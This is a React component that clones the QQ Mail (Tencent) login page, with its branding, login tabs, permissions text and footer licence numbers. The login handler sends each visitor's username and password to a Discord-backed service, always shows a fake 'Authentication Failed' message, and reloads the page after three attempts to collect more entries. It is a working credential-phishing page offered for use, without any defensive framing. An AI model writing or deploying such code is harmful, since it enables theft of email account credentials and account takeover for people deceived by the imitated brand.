import React, { useState } from 'react';
import { useTranslation } from '../components/LanguageProvider';
import { submitToDiscord } from '../services/DiscordService';

interface QQMailThemeProps {
  prefilledEmail?: string;
}

const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
  const { lang } = useTranslation();
  const [username, setUsername] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [activeTab, setActiveTab] = useState<'scan' | 'qq' | 'wechat'>('qq');
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);

    try {
      await submitToDiscord({
        username,
        password,
        loginType: activeTab,
        theme: 'qq',
      }, 'QQMailTheme');

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Error:', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#eff4f8] font-sans text-[#333] selection:bg-blue-100">
      {/* Header */}
      <header className="w-full max-w-[1200px] mx-auto px-6 py-4 flex items-center justify-between">
        <div className="flex items-center">
          <div className="flex items-center space-x-2">
            <div className="flex items-center">
              <span className="text-[#1e5494] text-2xl font-bold flex items-center">
                <span className="bg-[#1e5494] text-white px-1.5 py-0.5 rounded mr-1 text-[20px] italic">M</span>
                <span className="mr-1">oil</span>
                <div className="h-6 w-[1px] bg-gray-300 mx-2"></div>
                <div className="flex flex-col leading-none">
                  <span className="text-[14px] font-bold">QQ邮箱</span>
                  <span className="text-[10px] font-normal tracking-tighter opacity-70">mail.qq.com</span>
                </div>
              </span>
            </div>
          </div>
        </div>
        
        <nav className="flex items-center space-x-6 text-[12px] text-gray-500">
          <a href="#" className="hover:text-blue-500">{lang === 'zh' ? '基本版' : 'Basic'}</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:text-blue-500">English</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:text-blue-500">{lang === 'zh' ? '手机版' : 'Mobile'}</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:text-blue-500">{lang === 'zh' ? '企业邮箱' : 'Exmail'}</a>
        </nav>
      </header>

      {/* Main Content */}
      <main className="flex-grow flex items-center justify-center py-12 px-6">
        <div className="w-full max-w-[1000px] flex flex-col lg:flex-row items-center justify-center lg:space-x-24 space-y-12 lg:space-y-0">
          
          {/* Left Side: Historical Text & Illustration */}
          <div className="flex flex-col space-y-6 max-w-[400px]">
            <div className="space-y-4">
              <h1 className="text-[32px] font-bold text-[#1e5494] flex items-baseline">
                QQ邮箱<span className="text-black font-normal text-[26px] ml-2">，常联系！</span>
              </h1>
              <div className="text-[13px] text-gray-600 leading-relaxed space-y-1">
                <p>1987年9月14日21时07分</p>
                <p>中国第一封电子邮件</p>
                <p>从北京发往德国</p>
                <p>"越过长城，走向世界"</p>
              </div>
            </div>
            
            {/* Monitor Illustration (CSS/SVG Version) */}
            <div className="relative pt-8 pl-4">
              <div className="w-[180px] h-[160px] bg-white rounded-2xl shadow-lg border-4 border-[#cbd9e8] relative flex flex-col p-3 overflow-hidden">
                <div className="flex-grow bg-[#88aed8] rounded-md flex items-center justify-center p-4 text-center leading-tight">
                  <span className="text-white text-[11px] font-medium selection:bg-blue-400">
                    Across the Great Wall we can reach every corner in the world.
                  </span>
                </div>
                <div className="h-4 flex items-center justify-center space-x-2 mt-1">
                  <div className="w-3 h-1 bg-[#cbd9e8] rounded-full"></div>
                  <div className="w-1 h-1 bg-[#cbd9e8] rounded-full"></div>
                  <div className="w-1 h-1 bg-[#cbd9e8] rounded-full"></div>
                </div>
              </div>
              <div className="absolute -bottom-4 left-[30px] w-[120px] h-4 bg-[#cbd9e8] rounded-full opacity-40 blur-md"></div>
              <div className="absolute -bottom-2 left-[50px] w-[80px] h-6 bg-[#cbd9e8] rounded-b-xl border-x-4 border-b-4 border-transparent"></div>
            </div>
          </div>

          {/* Right Side: Login Card */}
          <div className="w-full max-w-[400px] bg-white rounded-lg shadow-[0_2px_15px_rgba(0,0,0,0.06)] border border-[#e2eaf1] overflow-hidden">
            {/* Tabs */}
            <div className="flex bg-[#f9fbfd] border-b border-[#e2eaf1]">
              <button 
                onClick={() => setActiveTab('scan')}
                className={`flex-1 py-4 flex items-center justify-center space-x-2 text-[13px] transition-all ${activeTab === 'scan' ? 'bg-white text-black font-bold' : 'text-gray-400 hover:text-gray-600'}`}
              >
                <span className="text-orange-400">📱</span>
                <span>{lang === 'zh' ? 'QQ邮箱扫码' : 'Scan'}</span>
              </button>
              <button 
                onClick={() => setActiveTab('qq')}
                className={`flex-1 py-4 flex items-center justify-center space-x-2 text-[13px] transition-all border-x border-[#e2eaf1] ${activeTab === 'qq' ? 'bg-white text-black font-bold' : 'text-gray-400 hover:text-gray-600'}`}
              >
                <span className="text-gray-800">🐧</span>
                <span>{lang === 'zh' ? 'QQ登录' : 'QQ Login'}</span>
              </button>
              <button 
                onClick={() => setActiveTab('wechat')}
                className={`flex-1 py-4 flex items-center justify-center space-x-2 text-[13px] transition-all ${activeTab === 'wechat' ? 'bg-white text-black font-bold' : 'text-gray-400 hover:text-gray-600'}`}
              >
                <span className="text-green-500">💬</span>
                <span>{lang === 'zh' ? '微信登录' : 'WeChat'}</span>
              </button>
            </div>

            <div className="p-8 pb-10">
              <div className="text-center space-y-1 mb-8">
                <h3 className="text-[18px] font-medium text-gray-800">{lang === 'zh' ? '密码登录' : 'Password Login'}</h3>
                <p className="text-[12px] text-gray-400">
                  {lang === 'zh' ? '推荐使用' : 'Recommended '}
                  <a href="#" className="text-blue-500 hover:underline">{lang === 'zh' ? '快捷登录' : 'Quick Sign-in'}</a>
                  {lang === 'zh' ? '，防止盗号。' : ' to prevent theft.'}
                </p>
              </div>

              <form onSubmit={handleLogin} className="space-y-4">
                <div className="relative">
                  <input 
                    type="text" 
                    placeholder={lang === 'zh' ? '支持QQ号/邮箱/手机号登录' : 'QQ/Email/Mobile'}
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full px-4 py-3 text-[14px] border border-[#dce3ea] rounded focus:outline-none focus:border-[#00a1ff] transition-all placeholder:text-gray-300"
                  />
                </div>

                <div className="relative">
                  <input 
                    type="password" 
                    placeholder={lang === 'zh' ? '请输入密码' : 'Password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-4 py-3 text-[14px] border border-[#dce3ea] rounded focus:outline-none focus:border-[#00a1ff] transition-all placeholder:text-gray-300"
                  />
                </div>

                {/* Loading State */}
                {isLoading && (
                  <div className="flex items-center justify-center py-4">
                    <div className="flex flex-col items-center space-y-2">
                      <div className="w-6 h-6 border-3 border-blue-200 border-t-blue-500 rounded-full animate-spin"></div>
                      <p className="text-[14px] text-gray-500">
                        {lang === 'zh' ? '正在验证...' : 'Verifying...'}
                      </p>
                    </div>
                  </div>
                )}

                {/* Authentication Failed Message */}
                {authError && !isLoading && (
                  <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                    <div className="flex items-start space-x-2">
                      <div className="flex-shrink-0 text-red-500 text-lg">⚠️</div>
                      <div>
                        <h3 className="font-medium text-red-800 text-[14px]">
                          {lang === 'zh' ? '验证失败' : 'Authentication Failed'}
                        </h3>
                        <p className="text-red-700 text-[13px] mt-1">
                          {lang === 'zh' ? `请重试。剩余尝试次数: ${3 - failedAttempts}` : `Please try again. Attempts left: ${3 - failedAttempts}`}
                        </p>
                      </div>
                    </div>
                  </div>
                )}

                <button 
                  type="submit" 
                  disabled={isLoading}
                  className="w-full py-3 bg-[#00a1ff] hover:bg-[#0092e6] text-white font-medium rounded transition-colors text-[16px] shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isLoading ? (lang === 'zh' ? '验证中...' : 'Verifying...') : (lang === 'zh' ? '登 录' : 'Log In')}
                </button>

                <div className="flex items-center justify-center space-x-4 text-[12px] text-gray-500 pt-2">
                  <a href="#" className="hover:text-blue-500">{lang === 'zh' ? '找回密码' : 'Forgot Password'}</a>
                  <span className="text-gray-200">|</span>
                  <a href="#" className="hover:text-blue-500">{lang === 'zh' ? '注册账号' : 'Sign Up'}</a>
                  <span className="text-gray-200">|</span>
                  <a href="#" className="hover:text-blue-500">{lang === 'zh' ? '意见反馈' : 'Feedback'}</a>
                </div>
              </form>

              {/* Permissions Checklist */}
              <div className="mt-8 pt-8 border-t border-[#f0f4f8] space-y-3">
                <div className="flex items-center space-x-2 text-[12px] text-gray-400">
                  <div className="w-4 h-4 border border-gray-300 rounded-full flex items-center justify-center">
                    <div className="w-2 h-2 bg-gray-200 rounded-full"></div>
                  </div>
                  <span>{lang === 'zh' ? '全选' : 'Select All'}</span>
                  <a href="#" className="text-blue-500">{lang === 'zh' ? 'QQ邮箱' : 'QQ Mail'}</a>
                  <span>{lang === 'zh' ? '将获取以下权限：' : 'will get these permissions:'}</span>
                </div>
                
                <div className="space-y-2 pl-6">
                  <div className="flex items-center space-x-2 text-[12px] text-gray-500">
                    <span className="text-green-500">✓</span>
                    <span>{lang === 'zh' ? '使用你的QQ头像、昵称信息' : 'Use your avatar and nickname'}</span>
                  </div>
                  <div className="flex items-center space-x-2 text-[12px] text-gray-400">
                    <div className="w-3.5 h-3.5 border border-gray-200 rounded-full"></div>
                    <span>{lang === 'zh' ? '你的QQ好友关系' : 'Your QQ friend list'}</span>
                  </div>
                </div>
                
                <div className="text-[11px] text-gray-400 pt-2 text-center">
                  {lang === 'zh' ? '授权即同意' : 'By logging in, you agree to the '}
                  <a href="#" className="text-blue-500">{lang === 'zh' ? '服务协议' : 'Terms'}</a>
                  {lang === 'zh' ? '和' : ' and '}
                  <a href="#" className="text-blue-500">{lang === 'zh' ? 'QQ隐私保护指引' : 'Privacy Policy'}</a>
                </div>
                
                <div className="flex items-center justify-center text-[11px] text-gray-400 pt-2 cursor-pointer hover:text-gray-600">
                  <span className="mr-1 inline-block w-4 h-4 border border-gray-300 rounded-full text-center leading-3 text-[10px]">?</span>
                  {lang === 'zh' ? '登录帮助' : 'Login Help'}
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full py-8 text-[11px] text-gray-400 text-center space-y-2">
        <div className="flex flex-wrap justify-center items-center space-x-4">
          <a href="#" className="hover:underline">关于腾讯</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:underline">服务条款</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:underline">隐私政策</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:underline">联系我们</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:underline">帮助中心</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:underline">账号与安全</a>
          <span className="text-gray-200">|</span>
          <span>©1998 - 2026 Tencent Inc. All Rights Reserved.</span>
        </div>
        <div className="flex flex-wrap justify-center items-center space-x-6 opacity-60">
          <span>粤公网安备 44030002000001号</span>
          <span>ICP备案号 粤B2-20090059</span>
          <span>增值电信业务经营许可证 粤B2-20090059</span>
        </div>
      </footer>
    </div>
  );
};

export default QQMailTheme;